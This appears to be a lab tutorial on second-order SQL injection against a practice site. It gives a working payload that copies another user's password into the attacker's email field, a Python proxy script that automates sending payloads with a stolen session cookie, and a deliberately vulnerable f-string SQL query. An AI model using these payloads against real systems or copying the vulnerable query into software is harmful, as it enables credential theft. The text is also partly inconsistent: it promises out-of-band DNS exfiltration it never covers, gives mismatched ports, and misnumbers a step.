## Second-Order-SQL-Injection

# Overview
- Use SQL queries to send data directly to your computer
- Configure a simple DNS server to receive data from an SQL server
- Perform simple filter evasion
- Extract data from an SQL server with OOB SQL Injection

### Definition
There are some applications where input fields for user-supplied information might not be immediately vulnerable to SQL injection, but the field gets stored in the database and later passed into an SQL query insecurely. This is called a second-order SQL Injection.

**Step 1: Executing a Second-Order SQL Injection Attack**

a. Open Burp Suite Community, then head to the proxy tab. Ensure that the intercept is turned off, then open the browser and browse the vulnerable website, here we are using: http://159.89.161.185:50.

![image](https://i.imgur.com/9W63yPJ.png)﻿


b. Register for an account. This example will be using the username ‘guest’.

c. Log into your account with the username and password you just registered with. You should see the page below.
﻿![image](https://i.imgur.com/7pO4eSx.png)

d. Head back to Burp Suite and turn “Intercept" on. Then, go back to the site, update your username, and press “Update". 
![image](https://i.imgur.com/z8jzlMR.png)
﻿
e. The request will appear in Burp Suite, right click any area on the request and click “Send to Repeater". Head back to the “Proxy” tab and drop the request.
![image﻿](https://i.imgur.com/3BbDk1d.png)


Back at the “Repeater” tab, you will be able to easily update your user information and edit your SQL injection payloads.

f. Click “Send" in the repeater and refresh the SQLi Lab page. You should be redirected to the main page. Click “Profile" to return to the profile page and you should see your new username.
![image](https://i.imgur.com/E00W00i.png)



However, the username, email, and password fields are vulnerable to SQL injection and run the SQL query below:
```
cursor.execute(f"UPDATE users SET username='{username}', email='{email}', password='{password}' WHERE uid={request.session['user']['uid']}")
```


This means that you could retrieve other users’ information and save it in your email to read.

g. In Burp Suite’s repeater, select the value of the email parameter. In the “Inspector" section, you should see “Decoded from: URL encoding". Enter the following payload into the text field to URL encode it, then click “Apply changes" and “Send".
```
', email=(SELECT password FROM (SELECT * FROM users) AS a WHERE username='test user'), password='
```

### The above query does the following:
- Closes the quote for updating the email
- Selects all users under the alias ‘a’ and filters the results by the username ‘test user’
- Sets the email to the password from the result of step 2
- Opens a new quote by setting the password column

**Step 2: Automating Second-Order SQL Injection**

Since the application redirects you to the main page every time you update your user information, it is difficult to test SQL Injection payloads as you would have to navigate to the profile page each time. To make it easier, you may write a script like the one below to run a proxy server that automates sending payloads and retrieving results.

a. Using your preferred IDE, create the file “app.py” and write the following code into it. Remember to replace “YOUR SESSION COOKIE” with your session cookie after registering and logging in, and “YOUR USERNAME” with your username.
```
import uvicorn
from fastapi import FastAPI, Request, Response, status, UploadFile, Form, File, WebSocket
import requests
from bs4 import BeautifulSoup

app = FastAPI()
url = "http://159.89.161.185:5007"

# create route with payload parameter to send SQLi payload

COOKIE = "YOUR SESSION COOKIE"
@app.get("/")
async def root(payload: str):
   r = requests.post(url+"/profile", cookies = {"session": COOKIE}, data = {"username": "YOUR USERNAME", "password": "test", "email": payload})
   r = requests.get(url+"/profile", cookies = {"session": COOKIE})
   soup = BeautifulSoup(r.text, 'html.parser')
   print("Payload: " + payload)
   print("SQLi Result: " + soup.find("input", {"name": "email"})['placeholder'])
   return r.text

if __name__ == '__main__':
   uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=True)
```

b. Install the required packages and run the server by running this in your terminal:
```
pip3 install fastapi uvicorn requests beautifulsoup4
python3 app.py
```

c. Then, navigate to http://localhost:8000 and run your SQL injection payloads by using the “payload" parameter.
```
http://localhost:8000/?payload=INSERT PAYLOAD
```

d. Using the payload from step 2! But this time, set the email field to the password instead of the username field. This is because the username field is a unique column. You should be able to receive the output of your SQL injection payload.
![image](https://i.imgur.com/82tS6Ch.png)

## References
https://app.stackup.dev
